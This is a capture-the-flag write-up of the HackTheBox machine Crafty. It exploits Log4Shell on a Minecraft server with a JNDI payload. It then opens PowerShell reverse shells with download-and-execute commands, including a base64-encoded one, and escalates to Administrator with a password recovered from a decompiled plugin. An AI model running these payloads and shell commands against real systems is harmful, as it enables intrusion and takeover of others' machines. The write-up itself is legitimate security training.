---
layout: writeup
category: HTB
description: Crafty is a easy windows machine in HackTheBox in which we have to abuse the following things. In first place, is needed to install a minecraft client to abuse the famous Log4j Shell in a minecraft server to gain access as svc_minecraft. Finally, we have to analyze a minecraft plugin (.jar) with jdgui and we can see that is using a password that it's also for user Administrator.
points: 20
solves: 3349
tags: minecraft log4j jdgui analyzing-jar minecraft-plugins
date: 2024-06-11
title: HTB Crafty writeup
comments: true
---

Crafty is a easy windows machine in HackTheBox in which we have to abuse the following things. In first place, is needed to install a minecraft client to abuse the famous Log4j Shell in a minecraft server to gain access as svc_minecraft. Finally, we have to analyze a minecraft plugin (.jar) with jdgui and we can see that is using a password that it's also for user Administrator.

# Enumeration

## Port scanning

We start with a basic TCP port scanning with nmap to see which ports are open and see which services are running:

```bash
❯ sudo nmap -p- --open -sS -sVC --min-rate 5000 -v -n -Pn 10.10.11.249
# Nmap 7.94SVN scan initiated Fri May 17 12:39:40 2024 as: nmap -p- --open -sS -sVC --min-rate 5000 -v -n -Pn -oN tcpTargeted 10.10.11.249
Nmap scan report for 10.10.11.249
Host is up (0.13s latency).
Not shown: 65533 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE   VERSION
80/tcp    open  http      Microsoft IIS httpd 10.0
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://crafty.htb
|_http-server-header: Microsoft-IIS/10.0
25565/tcp open  minecraft Minecraft 1.16.5 (Protocol: 127, Message: Crafty Server, Users: 0/100)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri May 17 12:40:19 2024 -- 1 IP address (1 host up) scanned in 39.09 seconds
```

* -sVC: Identifies service and version.
* -p-: scans all the range of ports (1-65535).
* --open: shows only open ports and not filtered or closed.
* -sS: TCP SYN scan that improves velocity because it doesn't establish the connection.
* --min-rate 5000: Sends 5000 packets per second to improve velocity (don't do this in a 
real environment).
* -n: Disables DNS resolution protocol.
* -v: Enables verbose to see which ports are opened while it's scanning
* -Pn: Disables host discovery protocol (ping).
* -oN targeted: Exports the evidence to a file named "tcpTargeted".

We have a minecraft server with version 1.16.5 which is very interesting in a HackTheBox machine, and a web running on port 80

## Web enumeration
            
First let's see the technologies used with whatweb:
```bash
❯ whatweb http://10.10.11.249 --log-brief=whatweb-ip.txt
http://10.10.11.249 [301 Moved Permanently] Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/10.0], IP[10.10.11.249], Microsoft-IIS[10.0], RedirectLocation[http://crafty.htb], Title[Document Moved]
ERROR Opening: http://crafty.htb - no address for crafty.htb
```

We can see that it uses the domain crafty.htb so it's needed to add it to the /etc/hosts:

```bash
10.10.11.249 crafty.htb
```

We can also see that it's using IIS:

```bash
❯ whatweb http://crafty.htb --log-brief=whatweb-ip.txt
http://crafty.htb [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.10.11.249], JQuery[3.6.0], Microsoft-IIS[10.0], Script[text/javascript], Title[Crafty - Official Website]
```
Taking a look to this domain in the browser, it's possible to see that the machine is more related to minecraft and play.crafty.htb is a valid domain:

![crafty.htb main page](/assets/images/Crafty/crafty.htb-main_page.png)

Which we have to add to the /etc/hosts and it redirect us to crafty.htb:

```bash
❯ curl -v play.crafty.htb
* Host play.crafty.htb:80 was resolved.
* IPv6: (none)
* IPv4: 10.10.11.249
*   Trying 10.10.11.249:80...
* Connected to play.crafty.htb (10.10.11.249) port 80
> GET / HTTP/1.1
> Host: play.crafty.htb
> User-Agent: curl/8.7.1
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 301 Moved Permanently
< Content-Type: text/html; charset=UTF-8
< Location: http://crafty.htb
< Server: Microsoft-IIS/10.0
< Date: Tue, 11 Jun 2024 17:43:33 GMT
< Content-Length: 140
< 
<head><title>Document Moved</title></head>
* Connection #0 to host play.crafty.htb left intact
<body><h1>Object Moved</h1>This document may be found <a HREF="http://crafty.htb">here</a></body>
```

There is no subdomain either:

```bash
❯ wfuzz -c -t 100 -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.crafty.htb" -u http://crafty.htb --hh=140
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://crafty.htb/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                
=====================================================================


Total time: 0
Processed Requests: 4989 
Filtered Requests: 4989
Requests/sec.: 0
```

The web doesn't have nothing interesting, so let's look for the minecraft server.

# Access as svc_minecraft

Looking in google related vulnerabilities with minecraft, we can see the famous log4j, which I thought that only affects version 1.17 but in [this article](https://help.minecraft.net/hc/en-us/articles/4416199399693-Security-Vulnerability-in-Minecraft-Java-Edition) of the official minecraft page is said that for some versions, it's needed to add a JVM argument to the server startup command. This versions include 1.16.5 which is the one running in the crafty minecraft server. The thought here is `What if this server hasn't added this JVM argument?`. 

> Note: To achieve this, we have to install a minecraft client and this is why Crafty was gived so low rating because a lot needed to install TLauncher and this had a lot of controversy due to that it had a virus. However, I will do it in a separate fresh Kali Linux VM to not be risky.

Now, to connect to the server I will use [TLauncher](https://tlauncher.org/en/) (select the 1.16.5 version to install in the launcher), add the server play.crafty.htb and connect:

```bash
❯ unzip TLauncher.v10.zip 
Archive:  TLauncher.v10.zip
   creating: TLauncher.v10/
  inflating: TLauncher.v10/README-EN.txt  
  inflating: TLauncher.v10/README-RUS.txt  
  inflating: TLauncher.v10/TLauncher.jar  
❯ h4x0r@nothing:~/Downloads$ cd TLauncher.v10
❯ h4x0r@nothing:~/Downloads/TLauncher.v10$ ls
README-EN.txt  README-RUS.txt  TLauncher.jar   
❯ h4x0r@nothing:~/Downloads/TLauncher.v10$ java -jar TLauncher.jar
```

![TLauncher version picking](/assets/images/Crafty/tlauncher_version_picking.png)

![Entered crafty server](/assets/images/Crafty/entered_crafty_server.png)

Now, I will download [this tool](https://github.com/kozmer/log4j-shell-poc) to abuse log4j. But first we have to download the official jdk of java version 1.8.0_20 (file jdk-8u20-linux-x64.tar.gz) as the repository says. Download it and extract it in the same folder you cloned the repository with this command:

```bash
$ tar -xf jdk-8u20-linux-x64.tar.gz
```

Also, execute this command to have all the dependencies:

```bash
$ pip3 install -r requirements.txt 
Defaulting to user installation because normal site-packages is not writeable
Requirement already satisfied: colorama in /usr/lib/python3/dist-packages (from -r requirements.txt (line 1)) (0.4.6)
Collecting argparse (from -r requirements.txt (line 2))
  Downloading argparse-1.4.0-py2.py3-none-any.whl.metadata (2.8 kB)
Downloading argparse-1.4.0-py2.py3-none-any.whl (23 kB)
Installing collected packages: argparse
Successfully installed argparse-1.4.0
```

Then, you have to modify the poc.py to replace `String cmd="/bin/sh";` to `String cmd="powershell.exe"` due to the fact that it's a windows machine.

Now run the `poc.py` to start the ldap and http servers required to exploit log4j with the `--lport 443` and `--userip <your tun0 ip>` parameters to receive the shell on port 443 of the ip of your hackthebox vpn:

```bash
$ python3 poc.py --userip 10.10.14.221 --lport 443

[!] CVE: CVE-2021-44228
[!] Github repo: https://github.com/kozmer/log4j-shell-poc

Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
[+] Exploit java class created success
[+] Setting up LDAP server

[+] Send me: ${jndi:ldap://10.10.14.221:1389/a}

[+] Starting Webserver on port 8000 http://0.0.0.0:8000
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Listening on 0.0.0.0:1389
```

Also spawn a nc listener on port 443:

```bash
$ rlwrap nc -lvnp 443
listening on [any] 443 ...
```

Send the payload:

![Log4j payload sended](/assets/images/Crafty/log4j_payload_sended.png)

We receive the shell as svc_minecraft! And we can see user.txt:

```bash
$ rlwrap nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.221] from (UNKNOWN) [10.10.11.249] 49681
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\users\svc_minecraft\server> whoami
crafty\svc_minecraft
PS C:\users\svc_minecraft\server> cd ..
PS C:\users\svc_minecraft> type Desktop\user.txt
50****************************3b
```

Now I will update my shell to a [ConPtyShell](https://github.com/antonioCoco/ConPtyShell) to have more stable shell, do ctrl+c, have autocompletion, etc:

**Start HTTP server to share Invoke-ConPtyShell.ps1**:

```bash
$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

**Start new nc listener**:

```bash
$ nc -lvnp 443   
listening on [any] 443 ...
```

**Execute ConPtyShell**

```powershell
PS C:\users\svc_minecraft\server> IEX(New-Object Net.WebClient).downloadString("http://10.10.14.221/Invoke-ConPtyShell.ps1")
PS C:\users\svc_minecraft\server> Invoke-ConPtyShell -RemoteIp 10.10.14.221 -RemotePort 443 -Rows 52 -Cols 191

CreatePseudoConsole function found! Spawning a fully interactive shell
```

> Note: you can view your current terminal rows and columns by using `stty size` in another window.

And we receive the shell:

```bash
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\users\svc_minecraft\server>
```

Now do ctrl+z, `stty raw -echo; fg` and `ctrl+l`.

# Access as administrator

Looking at the plugins, we can see that it exists one custom plugin called `playercounter`:

```powershell

PS C:\users\svc_minecraft\server> cd .\plugins\ 
PS C:\users\svc_minecraft\server\plugins> dir 


    Directory: C:\users\svc_minecraft\server\plugins


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       10/27/2023   2:48 PM           9996 playercounter-1.0-SNAPSHOT.jar
```

It would be useful to transfer it to our machine to analyze it:

**Create SMB server**:

```bash
$ impacket-smbserver -smb2support -username test -password 'test123$!' smbDir $(pwd)
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

**Use the SMB server in Z: and copy the file to this logic partition**:

```powershell
PS C:\users\svc_minecraft\server\plugins> net use z: \\10.10.14.221\smbDir /user:test 'test123$!'
The command completed successfully.

PS C:\users\svc_minecraft\server\plugins> copy .\playercounter-1.0-SNAPSHOT.jar z:
```

Now, as it is a .jar file, we can analyze it with jd-gui:

```bash
$ sudo apt install jd-gui
$ jd-gui playercounter-1.0-SNAPSHOT.jar
```

And we can see the source code:

![Source code of minecraft plugin](/assets/images/Crafty/minecraft_plugin_source_code.png)

Notice that there is a password that is used for the [rcon protocol](https://wiki.vg/RCON) to execute the command `players online count`.

Testing if this password is reused for admin with `RunasCs.exe`, it works:

```powershell
PS C:\users\svc_minecraft\server\plugins> cd C:\Windows\Temp            
PS C:\Windows\Temp> mkdir privesc 


    Directory: C:\Windows\Temp


Mode                LastWriteTime         Length Name
----                -------------         ------ ----                                                                                                                                          
d-----        6/11/2024   2:19 PM                privesc                                                                                                                                       


PS C:\Windows\Temp> cd privesc
# Download RunasCs.exe from your hosted http server
PS C:\Windows\Temp\privesc> certutil.exe -f -urlcache -split http://10.10.14.221/RunasCs.exe
****  Online  ****
  0000  ...
  ca00
CertUtil: -URLCache command completed successfully.
# Execute whoami as Administrator with RunasCs.exe 
PS C:\Windows\Temp\privesc> .\RunasCs.exe 'Administrator' s67u84zKq8IXw "cmd /c whoami"

crafty\administrator
```

So I will create a base64 payload to execute a ConPtyShell reverse shell (which you can create with the command `echo "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.221/Invoke-ConPtyShell.ps1'); Invoke-ConPtyShell -RemoteIp 10.10.14.221 -RemotePort 443 -Rows 52 -Cols 191" | iconv -t utf16le | base64 -w 0`) and paste it in the `-enc` argument of powershell to obtain the shell as administrator:

```powershell
PS C:\Windows\Temp\privesc> .\RunasCs.exe 'Administrator' s67u84zKq8IXw "powershell -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADIAMgAxAC8ASQBuAHYAbwBrAGUALQBDAG8AbgBQAHQAeQBTAGgAZQBsAGwALgBwAHMAMQAnACkAOwAgAEkAbgB2AG8AawBlAC0AQwBvAG4AUAB0AHkAUwBoAGUAbABsACAALQBSAGUAbQBvAHQAZQBJAHAAIAAxADAALgAxADAALgAxADQALgAyADIAMQAgAC0AUgBlAG0AbwB0AGUAUABvAHIAdAAgADQANAAzACAALQBSAG8AdwBzACAANQAyACAALQBDAG8AbABzACAAMQA5ADEACgA="
```

And we receive it!:

```bash
$ nc -lvnp 443
listening on [any]
PS C:\Windows\system32> whoami
crafty\administrator
```

Now we can see the root.txt and finish this entertaining machine:

```powershell
PS C:\Windows\system32> cd C:\Users\Administrator 
PS C:\Users\Administrator> type .\Desktop\root.txt 
2f****************************fa
```

# Extra

In this section, we will see why this minecraft version was vulnerable to log4j.

Well, in [this minecraft article](https://help.minecraft.net/hc/en-us/articles/4416199399693-Security-Vulnerability-in-Minecraft-Java-Edition), it's said that for servers with the version 1.16.5, it's needed to run the `java -jar server.jar` with the argument `-Dlog4j.configurationFile=log4j2_112-116.xml` that specifies a log4j configuration file that is [here](https://launcher.mojang.com/v1/objects/02937d122c86ce73319ef9975b58896fc1b491d1/log4j2_112-116.xml) to avoid log4shell vulnerability. 

In the processes, we can see that the minecraft server it's not running with that parameter and that's why it's vulnerable:

```powershell
PS C:\Users\Administrator> gwmi win32_process | select commandline | format-list | findstr server.jar
commandline : "c:\windows\system32\cmd.exe" /c "c:\program files\java\jdk1.8.0_171\bin\java.exe" -Xmx1024M -Xms1024M -jar c:\users\svc_minecraft\server\server.jar
commandline : "c:\program files\java\jdk1.8.0_171\bin\java.exe"  -Xmx1024M -Xms1024M -jar c:\users\svc_minecraft\server\server.jar
```
